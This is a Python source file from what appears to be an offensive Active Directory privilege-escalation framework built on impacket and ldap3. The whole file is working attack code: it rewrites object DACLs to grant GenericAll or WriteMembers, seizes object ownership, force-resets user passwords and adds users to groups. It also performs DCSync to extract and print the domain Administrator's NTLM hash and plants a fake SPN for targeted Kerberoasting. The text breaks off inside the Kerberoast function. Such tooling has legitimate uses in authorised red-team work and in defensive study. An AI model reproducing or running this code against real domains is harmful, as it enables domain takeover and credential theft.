"""Shared privesc actions for the module-based architecture."""

import binascii
import logging
import re
import subprocess
from datetime import datetime
from pathlib import Path
from uuid import UUID

import ldap3
from impacket.krb5 import constants
from impacket.krb5.asn1 import TGS_REP
from impacket.krb5.kerberosv5 import getKerberosTGS, getKerberosTGT
from impacket.krb5.types import Principal
from impacket.examples.secretsdump import NTDSHashes, RemoteOperations
from impacket.smbconnection import SMBConnection
from ldap3 import BASE, MODIFY_ADD, SUBTREE
from ldap3.protocol.microsoft import security_descriptor_control
from pyasn1.codec.der import decoder
from impacket.ldap import ldaptypes
from impacket.ldap.ldaptypes import ACCESS_ALLOWED_ACE, ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, ACE


def format_force_change_password_messages(target_identity, new_password, success=True):
    """Return the exact action/result/context strings for a password reset log sequence."""
    target_label = str(target_identity or "the target user").strip()
    action_message = f'Changing the password of user {target_label} to "{new_password}"'

    if success:
        result_message = f'Password of user {target_label} successfully set to "{new_password}"'
        context_message = f"Context changed to user {target_label} successfully."
    else:
        result_message = f"Password change failed for user {target_label}."
        context_message = None

    return {
        "action_message": action_message,
        "result_message": result_message,
        "context_message": context_message,
    }


def format_add_group_member_messages(member_identity, group_identity, success=True):
    """Return the exact action/result/context strings for an AddMember log sequence."""
    member_label = str(member_identity or "the foothold user").strip()
    group_label = str(group_identity or "the target group").strip()
    action_message = f"Adding {member_label} into {group_label} group"

    if success:
        result_message = f"Successfully added {member_label} to {group_label} group."
        context_message = f"Context changed to user {member_label} successfully."
    else:
        result_message = f"Failed to add {member_label} to {group_label} group."
        context_message = None

    return {
        "action_message": action_message,
        "result_message": result_message,
        "context_message": context_message,
    }


def format_grant_addmember_messages(member_identity, group_identity, success=True):
    """Return the exact action/result strings for granting WriteMembers rights on a group."""
    member_label = str(member_identity or "the foothold user").strip()
    group_label = str(group_identity or "the target group").strip()
    action_message = f"Granting WriteMembers on {group_label} to {member_label}"

    if success:
        result_message = f"Successfully granted WriteMembers on {group_label} to {member_label}."
    else:
        result_message = f"Failed to grant WriteMembers on {group_label} to {member_label}."

    return {
        "action_message": action_message,
        "result_message": result_message,
        "context_message": None,
    }


def format_memberof_passive_message():
    """Return the passive result string for a no-op MemberOf step."""
    return {
        "action_message": None,
        "result_message": "Passive module, no actions needed.",
        "context_message": None,
    }


def format_attack_completion_message(kind, subject, detail):
    """Return the final completion context string for a successful privesc chain."""
    subject_label = str(subject or "the target").strip()
    detail_label = str(detail or "").strip()

    if kind == "user":
        return f'Attack successfully completed. {subject_label}\'s password has been updated to "{detail_label}".'
    if kind == "group":
        return f'Attack successfully completed. {subject_label} has been added to the group {detail_label}.'
    if kind == "domain":
        return f'Attack successfully completed. Administrator NTLM hash extracted: {detail_label}'
    return "Attack successfully completed."


class PrivescActions:
    def __init__(self, engine):
        self.engine = engine
        self.conn = engine.conn
        self.domain = engine.domain
        self.dc_ip = engine.dc_ip
        self.project_id = getattr(engine, "project_id", None)
        self.last_grant_status = None
        self.last_grant_diagnostic = None
        self.last_grant_result = None
        self.last_owner_status = None
        self.last_owner_diagnostic = None
        self.last_owner_result = None

    @property
    def current_project_id(self):
        if self.project_id:
            return self.project_id
        try:
            from core.projects import ProjectManager
            return ProjectManager().get_active_project_id()
        except Exception:
            return None

    def _identity_variants(self, identity):
        """Return common AD identity aliases for the same principal."""
        if not identity:
            return []

        raw = str(identity).strip()
        variants = []
        seen = set()

        for candidate in [raw, raw.split("\\")[-1] if "\\" in raw else raw, raw.split("@")[0] if "@" in raw else raw]:
            if candidate and candidate not in seen:
                variants.append(candidate)
                seen.add(candidate)

        if "@" in raw:
            sam = raw.split("@")[0]
            if sam and sam not in seen:
                variants.append(sam)
                seen.add(sam)
        elif "\\" in raw:
            sam = raw.split("\\")[-1]
            if sam and sam not in seen:
                variants.append(sam)
                seen.add(sam)

        if self.domain:
            netbios = self.domain.split(".")[0]
            for candidate in [raw, variants[0] if variants else raw]:
                sam = candidate.split("\\")[-1] if "\\" in candidate else candidate.split("@")[0] if "@" in candidate else candidate
                for alias in [f"{netbios}\\{sam}", f"{sam}@{self.domain}", sam]:
                    if alias and alias not in seen:
                        variants.append(alias)
                        seen.add(alias)

        return variants

    def resolve_distinguished_name(self, identity):
        """Resolve a DN from UPN/name/sAMAccountName/cn when path data lacks DN."""
        if not identity:
            return None

        if isinstance(identity, str) and identity.upper().startswith("CN="):
            return identity

        domain_parts = [part for part in str(self.domain).split(".") if part]
        search_base = ",".join([f"DC={part}" for part in domain_parts])
        if not search_base:
            return None

        candidates = self._identity_variants(identity)
        for candidate in candidates:
            if not candidate:
                continue
            ldap_filter = (
                f"(|(distinguishedName={candidate})(userPrincipalName={candidate})"
                f"(sAMAccountName={candidate})(name={candidate})(cn={candidate}))"
            )
            try:
                if self.conn.search(
                    search_base=search_base,
                    search_filter=ldap_filter,
                    search_scope=SUBTREE,
                    attributes=["distinguishedName"],
                    size_limit=1,
                ) and self.conn.entries:
                    return str(self.conn.entries[0].entry_dn)
            except Exception as e:
                print(f"  [!] DN LOOKUP FAILED for {identity}: {e}")

        return None

    def get_edge_nodes(self, rel):
        """Return start/end node dicts, tolerating predictive list-style edges."""
        start_node = getattr(rel, "start_node", None) or {}
        end_node = getattr(rel, "end_node", None) or {}
        if not isinstance(start_node, dict):
            start_node = self._node_to_dict(start_node)
        if not isinstance(end_node, dict):
            end_node = self._node_to_dict(end_node)
        return start_node, end_node

    def get_object_sid(self, identity):
        """Resolve objectSid for a DN, UPN, or SAM-style identity."""
        if not identity:
            return None

        if isinstance(identity, str) and identity.upper().startswith("CN="):
            dn = identity
        else:
            dn = self.resolve_distinguished_name(identity)
            if not dn:
                for candidate in self._identity_variants(identity):
                    if not candidate:
                        continue
                    dn = self.resolve_distinguished_name(candidate)
                    if dn:
                        break

        if not dn:
            return None

        try:
            if self.conn.search(dn, "(objectClass=*)", search_scope=BASE, attributes=["objectSid"], size_limit=1) and self.conn.entries:
                sid_attr = self.conn.entries[0].entry_attributes_as_dict.get("objectSid")
                return sid_attr[0] if sid_attr else None
        except Exception as e:
            print(f"  [!] SID LOOKUP FAILED for {identity}: {e}")
        return None

    def load_security_descriptor(self, dn):
        """Read nTSecurityDescriptor for an object."""
        controls = security_descriptor_control(sdflags=0x07)
        try:
            if self.conn.search(dn, "(objectClass=*)", search_scope=BASE, attributes=["nTSecurityDescriptor"], controls=controls) and self.conn.entries:
                raw = self.conn.entries[0]["nTSecurityDescriptor"].raw_values[0]
                sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
                sd.fromString(raw)
                return sd
        except Exception as exc:
            logging.error("load_security_descriptor failed for %s: %s", dn, exc)
        return None

    def get_owner_sid(self, dn):
        """Return the current owner SID as a canonical string, if available."""
        sd = self.load_security_descriptor(dn)
        if not sd:
            return None
        try:
            owner = sd['OwnerSid']
        except Exception:
            return None
        if not owner:
            return None
        try:
            return owner.formatCanonical()
        except Exception:
            return str(owner)

    def is_member_of_group(self, group_dn, user_dn):
        """Check whether a user DN is already a member of a group."""
        if not group_dn or not user_dn:
            return False
        try:
            if not self.conn.search(group_dn, "(objectClass=*)", search_scope=BASE, attributes=["member"], size_limit=1) or not self.conn.entries:
                return False
            member_values = self.conn.entries[0].entry_attributes_as_dict.get("member", [])
            if not member_values:
                return False
            normalized_user = str(user_dn).lower()
            return any(str(member).lower() == normalized_user for member in member_values)
        except Exception as exc:
            logging.warning("is_member_of_group(%s, %s) failed: %s", group_dn, user_dn, exc)
            return False

    def save_security_descriptor(self, dn, sd, sdflags=0x04):
        """Write nTSecurityDescriptor back to an object."""
        controls = security_descriptor_control(sdflags=sdflags)
        return self.conn.modify(dn, {"nTSecurityDescriptor": [(ldap3.MODIFY_REPLACE, [sd.getData()])]}, controls=controls)

    def grant_full_control(self, dn, sid):
        """Add a full-control ACE to an object's DACL."""
        self.last_grant_status = None
        self.last_grant_diagnostic = None
        self.last_grant_result = None

        sd = self.load_security_descriptor(dn)
        if not sd:
            self.last_grant_status = "failed"
            self.last_grant_diagnostic = "Unable to load nTSecurityDescriptor for target object."
            return False

        ace = ACE()
        ace['AceType'] = ACCESS_ALLOWED_ACE.ACE_TYPE
        ace['AceFlags'] = 0x00
        ace_data = ACCESS_ALLOWED_ACE()
        ace_data['Mask'] = ACCESS_MASK()
        ace_data['Mask']['Mask'] = 983551
        ace_data['Sid'] = ldaptypes.LDAP_SID()
        ace_data['Sid'].fromCanonical(sid)
        ace['Ace'] = ace_data

        try:
            dacl = sd['Dacl']
        except Exception:
            dacl = None

        if dacl is None or dacl == b'':
            dacl = ldaptypes.ACL()
            dacl['AclRevision'] = 2
            dacl['Sbz1'] = 0
            dacl['Sbz2'] = 0
            dacl.aces = []
            sd['Dacl'] = dacl

        if not hasattr(sd['Dacl'], 'aces'):
            sd['Dacl'].aces = []

        sd['Dacl'].aces.append(ace)
        if not self.save_security_descriptor(dn, sd):
            self.last_grant_result = dict(getattr(self.conn, "result", {}) or {})
            code = self.last_grant_result.get("result")
            desc = self.last_grant_result.get("description")
            msg = self.last_grant_result.get("message")
            self.last_grant_status = "failed"
            self.last_grant_diagnostic = f"LDAP modify failed while writing GenericAll DACL (code={code}, description={desc}, message={msg})"
            return False

        self.last_grant_result = dict(getattr(self.conn, "result", {}) or {})
        self.last_grant_status = "granted"
        self.last_grant_diagnostic = "GenericAll ACE persisted."
        return True

    def _resolve_schema_guid(self, ldap_display_name):
        """Resolve an attribute schemaIDGUID from the directory schema."""
        try:
            if not self.conn.search(search_base="", search_filter="(objectClass=*)", search_scope=BASE, attributes=["schemaNamingContext"], size_limit=1) or not self.conn.entries:
                return None
            schema_nc = self.conn.entries[0].entry_attributes_as_dict.get("schemaNamingContext", [None])[0]
            if not schema_nc:
                return None
            search_filter = f"(&(objectClass=attributeSchema)(lDAPDisplayName={ldap_display_name}))"
            if not self.conn.search(search_base=str(schema_nc), search_filter=search_filter, search_scope=SUBTREE, attributes=["schemaIDGUID"], size_limit=1) or not self.conn.entries:
                return None
            raw_guid = self.conn.entries[0].entry_attributes_as_dict.get("schemaIDGUID", [None])[0]
            if not raw_guid:
                return None
            if isinstance(raw_guid, bytes) and len(raw_guid) == 16:
                return raw_guid
            if isinstance(raw_guid, str):
                try:
                    return UUID(raw_guid).bytes_le
                except Exception:
                    pass
            return bytes(raw_guid)
        except Exception as exc:
            logging.warning("schema GUID lookup failed for %s: %s", ldap_display_name, exc)
            return None

    def grant_generic_all(self, dn, sid):
        """Grant a superset of GenericAll permissions by adding full control to the target DACL."""
        return self.grant_full_control(dn, sid)

    def grant_group_addmember(self, dn, sid):
        """Grant WriteMembers by adding an object-specific ACE on the group member attribute."""
        self.last_grant_status = None
        self.last_grant_diagnostic = None
        self.last_grant_result = None

        sd = self.load_security_descriptor(dn)
        if not sd:
            self.last_grant_status = "failed"
            self.last_grant_diagnostic = "Unable to load nTSecurityDescriptor for target group."
            return False

        member_guid = self._resolve_schema_guid("member")
        if not member_guid:
            logging.warning("member schema GUID lookup failed for %s", dn)
            self.last_grant_status = "failed"
            self.last_grant_diagnostic = "member schema GUID lookup failed"
            return False

        ace = ACE()
        ace['AceType'] = ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
        ace['AceFlags'] = 0x00
        ace_data = ACCESS_ALLOWED_OBJECT_ACE()
        ace_data['Mask'] = ACCESS_MASK()
        ace_data['Mask']['Mask'] = (
            ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_READ_PROP |
            ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_WRITE_PROP
        )
        ace_data['Flags'] = ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT
        ace_data['ObjectType'] = member_guid
        ace_data['InheritedObjectType'] = b''
        ace_data['Sid'] = ldaptypes.LDAP_SID()
        ace_data['Sid'].fromCanonical(sid)
        ace['Ace'] = ace_data

        try:
            dacl = sd['Dacl']
        except Exception:
            dacl = None

        logging.debug("grant_group_addmember DACL type: %s", type(dacl))
        try:
            logging.debug("grant_group_addmember DACL ace count: %s", len(dacl.aces) if dacl is not None and hasattr(dacl, 'aces') else None)
            logging.debug("grant_group_addmember DACL aces: %r", dacl.aces if dacl is not None and hasattr(dacl, 'aces') else None)
        except Exception:
            pass

        if dacl is None or dacl == b'':
            dacl = ldaptypes.ACL()
            dacl['AclRevision'] = 2
            dacl['Sbz1'] = 0
            dacl['Sbz2'] = 0
            dacl.aces = []
            sd['Dacl'] = dacl

        if not hasattr(sd['Dacl'], 'aces'):
            sd['Dacl'].aces = []

        sd['Dacl'].aces.append(ace)
        if not self.save_security_descriptor(dn, sd):
            self.last_grant_result = dict(getattr(self.conn, "result", {}) or {})
            code = self.last_grant_result.get("result")
            desc = self.last_grant_result.get("description")
            msg = self.last_grant_result.get("message")
            self.last_grant_status = "failed"
            self.last_grant_diagnostic = f"LDAP modify failed while writing DACL (code={code}, description={desc}, message={msg})"
            logging.error("Failed to persist WriteMembers ACE on %s for SID %s: %s", dn, sid, self.last_grant_diagnostic)
            return False

        self.last_grant_result = dict(getattr(self.conn, "result", {}) or {})
        fresh_sd = self.load_security_descriptor(dn)
        if not fresh_sd:
            self.last_grant_status = "failed"
            self.last_grant_diagnostic = "Security descriptor reload failed after DACL write."
            logging.error("Failed to verify persisted WriteMembers ACE on %s for SID %s: %s", dn, sid, self.last_grant_diagnostic)
            return False

        try:
            fresh_dacl = fresh_sd['Dacl']
        except Exception:
            fresh_dacl = None

        if fresh_dacl is None or not hasattr(fresh_dacl, 'aces'):
            self.last_grant_status = "failed"
            self.last_grant_diagnostic = "Reloaded security descriptor has no accessible DACL ACE list."
            logging.error("Failed to verify persisted WriteMembers ACE on %s for SID %s: %s", dn, sid, self.last_grant_diagnostic)
            return False

        sid_canonical = str(sid)
        matched = False
        for persisted_ace in fresh_dacl.aces:
            try:
                if persisted_ace['AceType'] != ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE:
                    continue
                persisted = persisted_ace['Ace']
                persisted_sid = persisted['Sid'].formatCanonical()
                persisted_object_type = persisted['ObjectType']
                persisted_mask = persisted['Mask']['Mask']
                if (
                    persisted_sid == sid_canonical
                    and persisted_object_type == member_guid
                    and persisted_mask == (
                        ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_READ_PROP |
                        ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_WRITE_PROP
                    )
                ):
                    matched = True
                    break
            except Exception:
                continue

        if not matched:
            self.last_grant_status = "failed"
            self.last_grant_diagnostic = (
                "WriteMembers ACE missing after writeback; expected object-specific ACE for member attribute "
                "with READ_PROP|WRITE_PROP mask."
            )
            logging.error("WriteMembers ACE was not present after writeback on %s for SID %s", dn, sid)
            return False

        self.last_grant_status = "granted"
        self.last_grant_diagnostic = "WriteMembers ACE persisted and verified."
        logging.info("Granted WriteMembers via object-specific ACE on %s for SID %s using member GUID %s", dn, sid, member_guid.hex())
        return True

    def set_owner(self, dn, sid):
        """Set the owner SID on an object's security descriptor."""
        self.last_owner_status = None
        self.last_owner_diagnostic = None
        self.last_owner_result = None
        try:
            sd = self.load_security_descriptor(dn)
            if not sd:
                self.last_owner_status = "failed"
                self.last_owner_diagnostic = "Unable to load nTSecurityDescriptor for owner change."
                return False

            sd['OwnerSid'] = ldaptypes.LDAP_SID()
            sd['OwnerSid'].fromCanonical(sid)

            # Owner changes must be sent with OWNER_SECURITY_INFORMATION.
            if not self.save_security_descriptor(dn, sd, sdflags=0x01):
                self.last_owner_result = dict(getattr(self.conn, "result", {}) or {})
                code = self.last_owner_result.get("result")
                desc = self.last_owner_result.get("description")
                msg = self.last_owner_result.get("message")
                self.last_owner_status = "failed"
                self.last_owner_diagnostic = f"LDAP modify failed while writing owner (code={code}, description={desc}, message={msg})"
                return False

            self.last_owner_result = dict(getattr(self.conn, "result", {}) or {})

            fresh_owner = self.get_owner_sid(dn)
            if str(fresh_owner or "") != str(sid):
                self.last_owner_status = "failed"
                self.last_owner_diagnostic = f"Owner verification failed after write (expected={sid}, actual={fresh_owner})"
                return False

            self.last_owner_status = "changed"
            self.last_owner_diagnostic = "Owner SID persisted and verified."
            return True
        except Exception as exc:
            self.last_owner_status = "failed"
            self.last_owner_result = dict(getattr(self.conn, "result", {}) or {})
            self.last_owner_diagnostic = f"Owner change exception: {exc}"
            logging.error("set_owner failed for %s (sid=%s): %s", dn, sid, exc)
            return False

    def resolve_target(self, rel):
        """Resolve the most useful target endpoint for a relationship."""
        start_node, end_node = self.get_edge_nodes(rel)
        for node in (end_node, start_node):
            target_dn = node.get("distinguishedname")
            target_name = node.get("name")
            if target_dn or target_name:
                return target_dn or self.resolve_distinguished_name(target_name), target_name
        return None, None

    @staticmethod
    def _node_to_dict(node):
        if isinstance(node, dict):
            return node

        result = {}
        if hasattr(node, "get"):
            result["name"] = node.get("name")
            result["distinguishedname"] = node.get("distinguishedname")
            return result

        try:
            result["name"] = node["name"]
        except Exception:
            result["name"] = None

        try:
            result["distinguishedname"] = node["distinguishedname"]
        except Exception:
            result["distinguishedname"] = None

        return result

    def _resolve_kerberos_username(self):
        """Return a Kerberos-friendly username from the current LDAP bind identity."""
        raw_user = str(self.conn.user or "")
        if not raw_user:
            return raw_user

        if "\\" in raw_user:
            return raw_user.split("\\")[-1]

        if "@" in raw_user:
            return raw_user.split("@")[0]

        if raw_user.upper().startswith("CN="):
            try:
                if self.conn.search(
                    search_base=raw_user,
                    search_filter="(objectClass=*)",
                    search_scope=BASE,
                    attributes=["sAMAccountName", "userPrincipalName"],
                    size_limit=1,
                ) and self.conn.entries:
                    entry = self.conn.entries[0]

                    sam_attr = getattr(entry, "sAMAccountName", None)
                    if sam_attr and sam_attr.value:
                        return str(sam_attr.value)

                    upn_attr = getattr(entry, "userPrincipalName", None)
                    if upn_attr and upn_attr.value:
                        return str(upn_attr.value).split("@")[0]
            except Exception as e:
                print(f"  [!] USER RESOLUTION FAILED from DN bind: {e}")

        return raw_user

    def force_change_password(self, target_dn, new_password):
        from core.logger import logger

        target_label = str(target_dn or "the target user")
        logger.info(
            "PRIVESC",
            "privesc.force_change_password.started",
            f"Attempting ForceChangePassword against {target_label}",
            project_id=self.current_project_id,
            source="web.app",
            details={"target_dn": target_dn, "password_length": len(str(new_password or ""))},
        )
        print(f"[*] Exploiting ForceChangePassword on {target_dn}...")
        try:
            result = self.conn.extend.microsoft.modify_password(target_dn, new_password)
            if result:
                logger.info(
                    "PRIVESC",
                    "privesc.force_change_password.success",
                    f"ForceChangePassword succeeded for {target_label}",
                    project_id=self.current_project_id,
                    source="web.app",
                    details={"target_dn": target_dn, "password_length": len(str(new_password or ""))},
                )
                print(f"[+] {format_force_change_password_messages(target_label, new_password, success=True)['result_message']}")
            else:
                logger.warning(
                    "PRIVESC",
                    "privesc.force_change_password.failed",
                    f"ForceChangePassword returned a falsey result for {target_label}",
                    project_id=self.current_project_id,
                    source="web.app",
                    details={"target_dn": target_dn, "ldap_result": getattr(self.conn, 'result', {})},
                )
                try:
                    diag = getattr(self.conn, 'result', {})
                    print(f"  [!] LDAP RESULT: {diag}")
                except Exception:
                    pass
            return result
        except Exception as exc:
            logger.error(
                "PRIVESC",
                "privesc.force_change_password.exception",
                f"ForceChangePassword failed for {target_label}: {exc}",
                project_id=self.current_project_id,
                source="web.app",
                details={"target_dn": target_dn, "error": str(exc)},
            )
            print(f"  [!] ForceChangePassword call failed: {exc}")
            try:
                diag = getattr(self.conn, 'result', {})
                print(f"  [!] LDAP RESULT: {diag}")
            except Exception:
                pass
            return False

    def add_group_member(self, group_dn, user_dn):
        # user_dn may be a distinguishedName or a sam/UPN; resolve to DN if needed
        self.last_group_member_status = None
        self.last_group_member_message = None
        self.last_group_member_result = None
        try:
            resolved_user_dn = user_dn
            if not isinstance(user_dn, str) or not user_dn.upper().startswith("CN="):
                # attempt to resolve by name
                resolved = self.resolve_distinguished_name(user_dn)
                if resolved:
                    resolved_user_dn = resolved

            display_user = user_dn
            try:
                if isinstance(user_dn, str) and "@" in user_dn:
                    display_user = user_dn
                elif isinstance(resolved_user_dn, str) and resolved_user_dn.upper().startswith("CN="):
                    # try to extract CN or name
                    m = re.match(r"CN=([^,]+)", resolved_user_dn, re.IGNORECASE)
                    if m:
                        display_user = m.group(1)
            except Exception:
                display_user = str(user_dn)

            print(f"  [*] Attempting to add member '{display_user}' -> {group_dn}...")
            print(f"  [*] Resolved user DN: {resolved_user_dn}")
            success = self.conn.modify(group_dn, {"member": [(MODIFY_ADD, [resolved_user_dn])]})
            # always print LDAP result for diagnostics
            try:
                self.last_group_member_result = dict(getattr(self.conn, "result", {}) or {})
                print(f"  [*] LDAP modify result: {self.last_group_member_result}")
            except Exception:
                pass

            if not success:
                result_code = getattr(self.conn, "result", {}).get("result")
                diagnostic = getattr(self.conn, "result", {}).get("message") or getattr(self.conn, "result", {}).get("description")
                if result_code == 68 or (diagnostic and "already a member" in str(diagnostic).lower()):
                    self.last_group_member_status = "already_member"
                    self.last_group_member_message = f"{display_user} is already a member of this group. Proceeding."
                    print(f"  [-] {display_user} is already a member of this group. Proceeding.")
                    return True

                diagnostic_text = f"LDAP MODIFY_ADD failed (code={result_code}, diagnostic={diagnostic or 'none'})"
                print(f"  [!] {diagnostic_text}")
                from core.logger import logger

                logger.error(
                    "PRIVESC",
                    "privesc.add_group_member.failed",
                    diagnostic_text,
                    project_id=self.current_project_id,
                    source="web.app",
                    details={
                        "target_dn": group_dn,
                        "member": display_user,
                        "resolved_user_dn": resolved_user_dn,
                        "ldap_result": self.last_group_member_result,
                    },
                )
                self.last_group_member_status = "failed"
                self.last_group_member_message = f"Failed to add {display_user} to {group_dn}. {diagnostic_text}"
                return False

            print(f"  [+] Added {display_user} to {group_dn}")
            self.last_group_member_status = "added"
            self.last_group_member_message = f"Successfully added {display_user} to {group_dn} group."
            return True
        except Exception as e:
            print(f"  [!] Exception while adding member: {e}")
            try:
                self.last_group_member_result = dict(getattr(self.conn, 'result', {}) or {})
                print(f"  [!] LDAP RESULT: {self.last_group_member_result}")
            except Exception:
                pass
            from core.logger import logger

            logger.error(
                "PRIVESC",
                "privesc.add_group_member.exception",
                f"Exception while adding member {display_user} to {group_dn}: {e}",
                project_id=self.current_project_id,
                source="web.app",
                details={
                    "target_dn": group_dn,
                    "member": display_user,
                    "resolved_user_dn": resolved_user_dn,
                    "error": str(e),
                    "ldap_result": self.last_group_member_result,
                },
            )
            self.last_group_member_status = "failed"
            self.last_group_member_message = f"Failed to add {display_user} to {group_dn}. Exception: {e}"
            return False

    def dcsync(self, current_password):
        """Perform DCSync as the current principal and recover Administrator's NTLM hash."""

        from core.logger import logger

        actor = self._resolve_kerberos_username()
        target = "Administrator"
        remote_ops = None
        self.last_dcsync_hash = None
        stage = "startup"
        selected_samr_domain = None

        logger.info(
            "PRIVESC",
            "privesc.dcsync.started",
            f"Starting DCSync as {actor or 'unknown'} against {self.domain}",
            project_id=self.current_project_id,
            source="web.app",
            details={"actor": actor, "domain": self.domain, "dc_ip": self.dc_ip, "target": target},
        )

        try:
            stage = "smb_login"
            smb = SMBConnection(
                self.dc_ip,
                self.dc_ip,
                sess_port=445
            )
            smb.login(
                actor,
                current_password,
                self.domain
            )

            stage = "connect_samr"
            remote_ops = RemoteOperations(
                smb,
                False,
                kdcHost=self.dc_ip
            )

            # Use the same SAMR domain discovery pattern as secretsdump for cross-env stability.
            candidate_domains = []
            try:
                _, machine_domain = remote_ops.getMachineNameAndDomain()
                if machine_domain:
                    candidate_domains.append(str(machine_domain))
            except Exception:
                pass

            if self.domain:
                candidate_domains.append(str(self.domain))
                if "." in str(self.domain):
                    candidate_domains.append(str(self.domain).split(".")[0])

            samr_connected = False
            samr_errors = []
            seen_candidates = set()
            for domain_candidate in candidate_domains:
                cleaned = str(domain_candidate or "").strip()
                if not cleaned or cleaned.lower() in seen_candidates:
                    continue
                seen_candidates.add(cleaned.lower())
                try:
                    remote_ops.connectSamr(cleaned)
                    selected_samr_domain = cleaned
                    samr_connected = True
                    break
                except Exception as exc:
                    samr_errors.append(f"{cleaned}: {exc}")

            if not samr_connected:
                raise Exception(f"Failed to connect SAMR domain context ({'; '.join(samr_errors)})")

            stage = "resolve_sid"
            raw_sid = self.get_object_sid(target)

            if not raw_sid:
                raise Exception(
                    f"Could not resolve SID for {target}"
                )

            sid_obj = ldaptypes.LDAP_SID()

            if isinstance(raw_sid, (bytes, bytearray)):
                sid_obj.fromString(raw_sid)
            else:
                sid_obj.fromCanonical(str(raw_sid))

            target_sid = sid_obj.formatCanonical()

            stage = "drs_request"
            print("[*] Performing DCSync")

            try:
                user_record = remote_ops.DRSGetNCChangesSid(target_sid)
            except Exception as drs_exc:
                # Some environments reject SID-based DRS object replication with BAD_NC.
                # Follow secretsdump behavior: fallback to DRSCrackNames -> GUID lookup.
                sid_error = str(drs_exc)
                fallback_errors = []
                user_record = None

                try:
                    from impacket.dcerpc.v5 import drsuapi as drsuapi_v5
                except Exception:
                    drsuapi_v5 = None

                if drsuapi_v5 is not None:
                    candidate_accounts = []
                    if selected_samr_domain:
                        candidate_accounts.append(f"{selected_samr_domain}\\{target}")
                    if self.domain:
                        netbios = str(self.domain).split(".")[0]
                        candidate_accounts.append(f"{netbios}\\{target}")
                    candidate_accounts.append(target)

                    seen_accounts = set()
                    for account_name in candidate_accounts:
                        candidate = str(account_name or "").strip()
                        if not candidate or candidate.lower() in seen_accounts:
                            continue
                        seen_accounts.add(candidate.lower())

                        try:
                            if "\\" in candidate or "/" in candidate:
                                offered = drsuapi_v5.DS_NAME_FORMAT.DS_NT4_ACCOUNT_NAME
                                crack_name = candidate.replace("/", "\\")
                            else:
                                offered = drsuapi_v5.DS_NT4_ACCOUNT_NAME_SANS_DOMAIN
                                crack_name = candidate

                            cracked = remote_ops.DRSCrackNames(
                                offered,
                                drsuapi_v5.DS_NAME_FORMAT.DS_UNIQUE_ID_NAME,
                                name=crack_name,
                            )

                            result = cracked["pmsgOut"]["V1"]["pResult"]
                            c_items = int(result["cItems"])
                            if c_items != 1:
                                fallback_errors.append(f"{candidate}: crack returned {c_items} items")
                                continue

                            item = result["rItems"][0]
                            status = int(item["status"])
                            if status != 0:
                                fallback_errors.append(f"{candidate}: crack status={status}")
                                continue

                            user_guid = item["pName"][:-1]
                            user_record = remote_ops.DRSGetNCChangesGuid(user_guid)
                            break
                        except Exception as fallback_exc:
                            fallback_errors.append(f"{candidate}: {fallback_exc}")

                if user_record is None:
                    if "ERROR_DS_DRA_BAD_NC" in sid_error and fallback_errors:
                        raise Exception(f"{sid_error} | GUID fallback failed ({'; '.join(fallback_errors)})")
                    raise

            reply_version = f"V{user_record['pdwOutVersion']}"
            reply = user_record['pmsgOut'][reply_version]

            if reply['cNumObjects'] <= 0:
                raise Exception(
                    "DCSync returned no objects"
                )

            print("[+] DCSync Request Successful")

            prefix_table = reply['PrefixTableSrc']['pPrefixEntry']
            recovered_hashes = []

            def hash_callback(secret_type, secret):
                if secret_type == NTDSHashes.SECRET_TYPE.NTDS:
                    recovered_hashes.append(str(secret))

            ntds = NTDSHashes(
                None,
                b'',
                isRemote=False,
                history=False,
                noLMHash=True,
                remoteOps=remote_ops,
                useVSSMethod=False,
                remoteSSMethodWMINTDS=False,
                justNTLM=True,
                pwdLastSet=False,
                resumeSession=None,
                outputFileName=None,
                justUser=None,
                skipUser=None,
                ldapFilter=None,
                printUserStatus=False,
                perSecretCallback=hash_callback
            )

            try:
                ntds._NTDSHashes__decryptHash(
                    user_record,
                    prefix_table,
                    None
                )
            finally:
                try:
                    ntds.finish()
                except Exception:
                    pass

            administrator_hash = None

            for recovered in recovered_hashes:
                parts = recovered.split(":")

                if len(parts) >= 4:
                    username = parts[0].lower()
                    rid = parts[1]

                    if username == "administrator" or rid == "500":
                        administrator_hash = parts[3]
                        break

            if not administrator_hash:
                raise Exception(
                    "Administrator NTLM hash was not recovered"
                )

            print(
                f"[+] Administrator NTLM Hash: "
                f"{administrator_hash}"
            )

            self.last_dcsync_hash = administrator_hash

            logger.info(
                "PRIVESC",
                "privesc.dcsync.success",
                f"DCSync succeeded for {actor or 'unknown'}",
                project_id=self.current_project_id,
                source="web.app",
                details={"actor": actor, "domain": self.domain, "dc_ip": self.dc_ip, "target": target, "proof_value": administrator_hash, "samr_domain": selected_samr_domain},
            )

            return administrator_hash

        except Exception as e:
            logger.error(
                "PRIVESC",
                "privesc.dcsync.exception",
                f"DCSync failed at stage {stage} for {actor or 'unknown'}: {e}",
                project_id=self.current_project_id,
                source="web.app",
                details={"actor": actor, "domain": self.domain, "dc_ip": self.dc_ip, "target": target, "stage": stage, "error": str(e), "samr_domain": selected_samr_domain},
            )
            print(f"[!] DCSync Failed: {e}")
            self.last_dcsync_hash = None
            return False

        finally:
            if remote_ops is not None:
                try:
                    remote_ops.finish()
                except Exception:
                    pass

    def set_fake_spn(self, target_dn, spn_value="viper/roasted"):
        print(f"  [*] Attempting LDAP MODIFY_ADD for servicePrincipalName...")
        success = self.conn.modify(target_dn, {"servicePrincipalName": [(MODIFY_ADD, [spn_value])]})

        if not success:
            result_code = self.conn.result["result"]
            diagnostic = self.conn.result.get("message", "")

            if result_code == 68 or "1006" in diagnostic:
                print(f"  [-] SPN value '{spn_value}' already exists on target. Skipping safely.")
                return True

            print("  [!] SPN SET FAILED")
            print(f"  [!] LDAP ERROR: {self.conn.result.get('description', 'Unknown')}")
            print(f"  [!] DIAGNOSTIC: {diagnostic or 'No detail provided'}")

        return success

    def request_kerberoast_hash(self, target_user_name, spn, current_password):
        print(f"  [*] INITIATING: Remote TGS-REQ for SPN {spn}")

        try:
            target_principal = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
            user = self._resolve_kerberos_username()

